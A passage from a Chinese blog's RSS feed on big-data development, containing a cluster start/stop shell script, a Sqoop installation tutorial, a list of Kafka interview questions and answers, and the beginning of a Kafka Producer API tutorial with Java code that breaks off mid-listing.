#启动 Zookeeper集群        zk.sh start        #启动 Hadoop集群        hdp.sh start        #启动 Kafka采集集群        kf.sh start        #启动 Flume采集集群        f1.sh start        #启动 Flume消费集群        f2.sh start        &#125;;;"stop")&#123;        echo ================== 停止 集群 ==================        #停止 Flume消费集群        f2.sh stop        #停止 Flume采集集群        f1.sh stop        #停止 Kafka采集集群        kf.sh stop        #停止 Hadoop集群        hdp.sh stop        #停止 Zookeeper集群        zk.sh stop&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）增加脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> u+x cluster.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）cluster集群启动脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ cluster.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）cluster集群停止脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ cluster.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="6-项目2-采集业务数据"><a href="#6-项目2-采集业务数据" class="headerlink" title="6 项目2 采集业务数据"></a>6 项目2 采集业务数据</h1>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/%E6%95%B0%E4%BB%93%E9%87%87%E9%9B%86%E9%A1%B9%E7%9B%AE/">数仓采集项目</category>
      
      
      <comments>https://m01ly.github.io/2020/11/23/bigdata-datacollect1-userbehavior/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>sqoop安装教程</title>
      <link>https://m01ly.github.io/2020/11/22/bigdata-sqoop/</link>
      <guid>https://m01ly.github.io/2020/11/22/bigdata-sqoop/</guid>
      <pubDate>Sun, 22 Nov 2020 07:10:21 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-下载并解压"><a href="#1-下载并解压" class="headerlink" title="1 下载并解压"></a>1 下载并解压</h3><p>1）下载地址：<a href="http://mirrors.hust.edu.cn/apache/sqoop/1.4.6/">http://mirrors.hust.edu.cn/apache/sqoop/1.4.6/</a></p><p>2）上传安装包sqoop-1.4.6.bin__hadoop-2.0.4-alpha.tar.gz到hadoop102的/opt/software路径中</p><p>3）解压sqoop安装包到指定目录，如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxf sqoop-1.4.6.bin__hadoop-2.0.4-alpha.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）解压sqoop安装包到指定目录，如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">mv</span> sqoop-1.4.6.bin__hadoop-2.0.4-alpha/ sqoop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2 修改配置文件"></a>2 修改配置文件</h3><ol><li>进入到/opt/module/sqoop/conf目录，重命名配置文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ <span class="token function">mv</span> sqoop-env-template.sh sqoop-env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>修改配置文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ vim sqoop-env.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>增加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> HADOOP_COMMON_HOME<span class="token operator">=</span>/opt/module/hadoop-3.1.3<span class="token function">export</span> HADOOP_MAPRED_HOME<span class="token operator">=</span>/opt/module/hadoop-3.1.3<span class="token function">export</span> HIVE_HOME<span class="token operator">=</span>/opt/module/hive<span class="token function">export</span> ZOOKEEPER_HOME<span class="token operator">=</span>/opt/module/zookeeper-3.5.7<span class="token function">export</span> ZOOCFGDIR<span class="token operator">=</span>/opt/module/zookeeper-3.5.7/conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-拷贝JDBC驱动"><a href="#3-拷贝JDBC驱动" class="headerlink" title="3 拷贝JDBC驱动"></a>3 拷贝JDBC驱动</h3><p>1）将mysql-connector-java-5.1.48.jar 上传到/opt/software路径</p><p>2）进入到/opt/software/路径，拷贝jdbc驱动到sqoop的lib目录下。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">cp</span> mysql-connector-java-5.1.48.jar /opt/module/sqoop/lib/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-验证Sqoop"><a href="#4-验证Sqoop" class="headerlink" title="4 验证Sqoop"></a>4 验证Sqoop</h3><p>我们可以通过某一个command来验证sqoop配置是否正确：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 sqoop<span class="token punctuation">]</span>$ bin/sqoop <span class="token function">help</span>Available commands:  codegen            Generate code to interact with database records  create-hive-table     Import a table definition into Hive  <span class="token function">eval</span>               Evaluate a SQL statement and display the results  <span class="token function">export</span>             Export an HDFS directory to a database table  <span class="token function">help</span>               List available commands  <span class="token function">import</span>             Import a table from a database to HDFS  import-all-tables     Import tables from a database to HDFS  import-mainframe    Import datasets from a mainframe server to HDFS  job                Work with saved <span class="token function">jobs</span>  list-databases        List available databases on a server  list-tables           List available tables <span class="token keyword">in</span> a database  merge              Merge results of incremental imports  metastore           Run a standalone Sqoop metastore  version            Display version information<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-测试Sqoop是否能够成功连接数据库"><a href="#5-测试Sqoop是否能够成功连接数据库" class="headerlink" title="5 测试Sqoop是否能够成功连接数据库"></a>5 测试Sqoop是否能够成功连接数据库</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 sqoop<span class="token punctuation">]</span>$ bin/sqoop list-databases --connect jdbc:mysql://hadoop102:3306/ --username root --password 000000information_schemametastoremysqloozieperformance_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/sqoop/">sqoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/22/bigdata-sqoop/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kafka学习笔记（四） kafka面试集锦</title>
      <link>https://m01ly.github.io/2020/11/18/bigdata-kafka4-test/</link>
      <guid>https://m01ly.github.io/2020/11/18/bigdata-kafka4-test/</guid>
      <pubDate>Tue, 17 Nov 2020 22:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Kafka中的ISR、AR又代表什么？"><a href="#1-Kafka中的ISR、AR又代表什么？" class="headerlink" title="1. Kafka中的ISR、AR又代表什么？"></a>1. Kafka中的ISR、AR又代表什么？</h2><p>  ISR：与leader保持同步的follower集合</p><p>  AR：分区的所有副本</p><h2 id="2-Kafka中的HW、LEO等分别代表什么？"><a href="#2-Kafka中的HW、LEO等分别代表什么？" class="headerlink" title="2. Kafka中的HW、LEO等分别代表什么？"></a>2. Kafka中的HW、LEO等分别代表什么？</h2><p>  LEO：没个副本的最后条消息的offset</p><p>  HW：一个分区中所有副本最小的offset</p><h2 id="3-Kafka中是怎么体现消息顺序性的？"><a href="#3-Kafka中是怎么体现消息顺序性的？" class="headerlink" title="3. Kafka中是怎么体现消息顺序性的？"></a>3. Kafka中是怎么体现消息顺序性的？</h2><p>  每个分区内，每条消息都有一个offset，故只能保证分区内有序。</p><h2 id="4-Kafka中的分区器、序列化器、拦截器是否了解？它们之间的处理顺序是什么？"><a href="#4-Kafka中的分区器、序列化器、拦截器是否了解？它们之间的处理顺序是什么？" class="headerlink" title="4. Kafka中的分区器、序列化器、拦截器是否了解？它们之间的处理顺序是什么？"></a>4. Kafka中的分区器、序列化器、拦截器是否了解？它们之间的处理顺序是什么？</h2><p>  拦截器 -&gt; 序列化器 -&gt; 分区器</p><h2 id="5-Kafka生产者客户端的整体结构是什么样子的？使用了几个线程来处理？分别是什么？"><a href="#5-Kafka生产者客户端的整体结构是什么样子的？使用了几个线程来处理？分别是什么？" class="headerlink" title="5. Kafka生产者客户端的整体结构是什么样子的？使用了几个线程来处理？分别是什么？"></a>5. Kafka生产者客户端的整体结构是什么样子的？使用了几个线程来处理？分别是什么？</h2><p>​                                <img src="/2020/11/18/bigdata-kafka4-test/1637308582846.png" alt="1637308582846"></p><h2 id="6-“消费组中的消费者个数如果超过topic的分区，那么就会有消费者消费不到数据”这句话是否正确？"><a href="#6-“消费组中的消费者个数如果超过topic的分区，那么就会有消费者消费不到数据”这句话是否正确？" class="headerlink" title="6. “消费组中的消费者个数如果超过topic的分区，那么就会有消费者消费不到数据”这句话是否正确？"></a>6. “消费组中的消费者个数如果超过topic的分区，那么就会有消费者消费不到数据”这句话是否正确？</h2><p>  正确</p><h2 id="7-消费者提交消费位移时提交的是当前消费到的最新消息的offset还是offset-1？"><a href="#7-消费者提交消费位移时提交的是当前消费到的最新消息的offset还是offset-1？" class="headerlink" title="7. 消费者提交消费位移时提交的是当前消费到的最新消息的offset还是offset+1？"></a>7. 消费者提交消费位移时提交的是当前消费到的最新消息的offset还是offset+1？</h2><p>  offset+1</p><h2 id="8-有哪些情形会造成重复消费？"><a href="#8-有哪些情形会造成重复消费？" class="headerlink" title="8. 有哪些情形会造成重复消费？"></a>8. 有哪些情形会造成重复消费？</h2><p>   <img src="/2020/11/18/bigdata-kafka4-test/1637308597607.png" alt="1637308597607"></p><h2 id="9-那些情景会造成消息漏消费？"><a href="#9-那些情景会造成消息漏消费？" class="headerlink" title="9. 那些情景会造成消息漏消费？"></a>9. 那些情景会造成消息漏消费？</h2><p>  先提交offset，后消费，有可能造成数据的重复</p><h2 id="10-当你使用kafka-topics-sh创建（删除）了一个topic之后，Kafka背后会执行什么逻辑？"><a href="#10-当你使用kafka-topics-sh创建（删除）了一个topic之后，Kafka背后会执行什么逻辑？" class="headerlink" title="10. 当你使用kafka-topics.sh创建（删除）了一个topic之后，Kafka背后会执行什么逻辑？"></a>10. 当你使用kafka-topics.sh创建（删除）了一个topic之后，Kafka背后会执行什么逻辑？</h2><p>  1）会在zookeeper中的/brokers/topics节点下创建一个新的topic节点，如：/brokers/topics/first</p><p>  2）触发Controller的监听程序</p><p>  3）kafka Controller 负责topic的创建工作，并更新metadata cache</p><h2 id="11-topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？"><a href="#11-topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？" class="headerlink" title="11. topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？"></a>11. topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？</h2><p>可以增加</p><p>bin/kafka-topics.sh –zookeeper localhost:2181/kafka –alter –topic topic-config –partitions 3</p><h2 id="12-topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？"><a href="#12-topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？" class="headerlink" title="12. topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？"></a>12. topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？</h2><p>  不可以减少，现有的分区数据难以处理。</p><h2 id="13-Kafka有内部的topic吗？如果有是什么？有什么所用？"><a href="#13-Kafka有内部的topic吗？如果有是什么？有什么所用？" class="headerlink" title="13. Kafka有内部的topic吗？如果有是什么？有什么所用？"></a>13. Kafka有内部的topic吗？如果有是什么？有什么所用？</h2><p>  __consumer_offsets,保存消费者offset</p><h2 id="14-Kafka分区分配的概念？"><a href="#14-Kafka分区分配的概念？" class="headerlink" title="14. Kafka分区分配的概念？"></a>14. Kafka分区分配的概念？</h2><p>  一个topic多个分区，一个消费者组多个消费者，故需要将分区分配个消费者(roundrobin、range)</p><h2 id="15-简述Kafka的日志目录结构？"><a href="#15-简述Kafka的日志目录结构？" class="headerlink" title="15. 简述Kafka的日志目录结构？"></a>15. 简述Kafka的日志目录结构？</h2><p>  每个分区对应一个文件夹，文件夹的命名为topic-0，topic-1，内部为.log和.index文件</p><h2 id="16-如果我指定了一个offset，Kafka-Controller怎么查找到对应的消息？"><a href="#16-如果我指定了一个offset，Kafka-Controller怎么查找到对应的消息？" class="headerlink" title="16. 如果我指定了一个offset，Kafka Controller怎么查找到对应的消息？"></a>16. 如果我指定了一个offset，Kafka Controller怎么查找到对应的消息？</h2><p>​    <img src="/2020/11/18/bigdata-kafka4-test/1637308610926.png" alt="1637308610926"></p><h2 id="17-聊一聊Kafka-Controller的作用？"><a href="#17-聊一聊Kafka-Controller的作用？" class="headerlink" title="17. 聊一聊Kafka Controller的作用？"></a>17. 聊一聊Kafka Controller的作用？</h2><p>  负责管理集群broker的上下线，所有topic的分区副本分配和leader选举等工作。</p><h2 id="18-Kafka中有那些地方需要选举？这些地方的选举策略又有哪些？"><a href="#18-Kafka中有那些地方需要选举？这些地方的选举策略又有哪些？" class="headerlink" title="18. Kafka中有那些地方需要选举？这些地方的选举策略又有哪些？"></a>18. Kafka中有那些地方需要选举？这些地方的选举策略又有哪些？</h2><p>  partition leader（ISR），controller（先到先得）</p><h2 id="19-失效副本是指什么？有那些应对措施？"><a href="#19-失效副本是指什么？有那些应对措施？" class="headerlink" title="19. 失效副本是指什么？有那些应对措施？"></a>19. 失效副本是指什么？有那些应对措施？</h2><p>  不能及时与leader同步，暂时踢出ISR，等其追上leader之后再重新加入</p><h2 id="20-Kafka的那些设计让它有如此高的性能？"><a href="#20-Kafka的那些设计让它有如此高的性能？" class="headerlink" title="20. Kafka的那些设计让它有如此高的性能？"></a>20. Kafka的那些设计让它有如此高的性能？</h2><p>  分区，顺序写磁盘，0-copy</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/kafka/">kafka</category>
      
      
      <comments>https://m01ly.github.io/2020/11/18/bigdata-kafka4-test/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kafka学习笔记（三） kafka的API使用</title>
      <link>https://m01ly.github.io/2020/11/17/bigdata-kafka3-API/</link>
      <guid>https://m01ly.github.io/2020/11/17/bigdata-kafka3-API/</guid>
      <pubDate>Mon, 16 Nov 2020 22:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Producer-API"><a href="#1-Producer-API" class="headerlink" title="1 Producer API"></a>1 Producer API</h2><h3 id="1-1-消息发送流程"><a href="#1-1-消息发送流程" class="headerlink" title="1.1 消息发送流程"></a>1.1 消息发送流程</h3><p>Kafka的Producer发送消息采用的是异步发送的方式。在消息发送的过程中，涉及到了两个线程——main线程和Sender线程，以及一个线程共享变量——RecordAccumulator。main线程将消息发送给RecordAccumulator，Sender线程不断从RecordAccumulator中拉取消息发送到Kafka broker。</p><p>​                     <img src="/2020/11/17/bigdata-kafka3-API/1637308075061.png" alt="1637308075061">           </p><p>相关参数：</p><p>batch.size：只有数据积累到batch.size之后，sender才会发送数据。</p><p>linger.ms：如果数据迟迟未达到batch.size，sender等待linger.time之后就会发送数据。</p><h3 id="1-2-异步发送API"><a href="#1-2-异步发送API" class="headerlink" title="1.2 异步发送API"></a>1.2 异步发送API</h3><p>1）导入依赖</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.4.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-slf4j-impl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.12.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）添加log4j配置文件</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span> <span class="token attr-name">strict</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XMLConfig<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 类型名为Console，名称为必须属性 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appender</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 布局为PatternLayout的方式，            输出样式为[INFO] [2018-01-22 17:34:01][org.test.Console]I'm here --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Layout</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PatternLayout<span class="token punctuation">"</span></span>                    <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>[%p] [%d&amp;#123;yyyy-MM-dd HH:mm:ss&amp;#125;][%c&amp;#123;10&amp;#125;]%m%n<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appender</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 可加性为false --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Logger</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- root loggerConfig设置 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）编写代码</p><p>需要用到的类：</p><p>KafkaProducer：需要创建一个生产者对象，用来发送数据</p><p>ProducerConfig：获取所需的一系列配置参数</p><p>ProducerRecord：每条数据都要封装成一个ProducerRecord对象</p><p>（1）不带回调函数的API</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ExecutionException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomProducer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//kafka集群，broker-list</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"acks"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//重试次数</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"retries"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//批次大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"batch.size"</span><span class="token punctuation">,</span> <span class="token number">16384</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//等待时间</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"linger.ms"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//RecordAccumulator缓冲区大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"buffer.memory"</span><span class="token punctuation">,</span> <span class="token number">33554432</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Producer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）带回调函数的API</p><p>回调函数会在producer收到ack时调用，为异步调用，该方法有两个参数，分别是RecordMetadata和Exception，如果Exception为null，说明消息发送成功，如果Exception不为null，说明消息发送失败。</p><p>注意：消息发送失败会自动重试，不需要我们在回调函数中手动重试。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token 